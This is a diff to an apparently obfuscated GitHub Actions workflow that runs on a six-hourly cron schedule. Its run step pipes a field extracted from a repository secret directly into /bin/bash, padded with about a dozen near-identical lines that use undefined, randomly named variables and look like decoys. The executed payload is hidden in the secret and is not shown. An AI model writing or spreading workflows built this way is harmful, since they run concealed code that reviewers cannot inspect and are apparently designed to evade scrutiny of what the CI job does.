@@ -3,7 +3,7 @@ name: qiaosangou8129
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 2/6 * * *'
+    - cron: '55 2/6 * * *'
 
 jobs:
   build:
@@ -13,17 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiaosangou8129
         env:
-          p382: ${{ secrets.p382 }}
+          d5: ${{ secrets.d5 }}
         run: |
-          echo $p382 | jq -r .u83 | /bin/bash
-          echo $bzol93617 | jq -r .qwa7374 | /bin/bash
-          echo $bkr709 | jq -r .ftxc596 | /bin/bash
-          echo $ps6 | jq -r .rg189 | /bin/bash
-          echo $zwyw31503 | jq -r .hv157 | /bin/bash
-          echo $dvwq5 | jq -r .nyqp7202 | /bin/bash
-          echo $jh60 | jq -r .rlh8 | /bin/bash
-          echo $e43 | jq -r .g55636 | /bin/bash
-          echo $ya31 | jq -r .ev29 | /bin/bash
-          echo $bgiw86624 | jq -r .ufom8 | /bin/bash
-          echo $uab8 | jq -r .kzrbh26 | /bin/bash
+          echo $d5 | jq -r .ob72 | /bin/bash
+          echo $nlaos8 | jq -r .cbwt3013 | /bin/bash
+          echo $g11 | jq -r .m93681 | /bin/bash
+          echo $ujknc4078 | jq -r .z099 | /bin/bash
+          echo $xm869 | jq -r .yq464 | /bin/bash
+          echo $gkon62137 | jq -r .zj79868 | /bin/bash
+          echo $jdy68 | jq -r .rca4 | /bin/bash
+          echo $lsv52 | jq -r .xie49539 | /bin/bash
+          echo $ma7 | jq -r .mx76 | /bin/bash
+          echo $w3836 | jq -r .uvxa05 | /bin/bash
+          echo $b7 | jq -r .vkzj5931 | /bin/bash
+          echo $rwfno1 | jq -r .ic3354 | /bin/bash
+          echo $ji1 | jq -r .wk7479 | /bin/bash
 
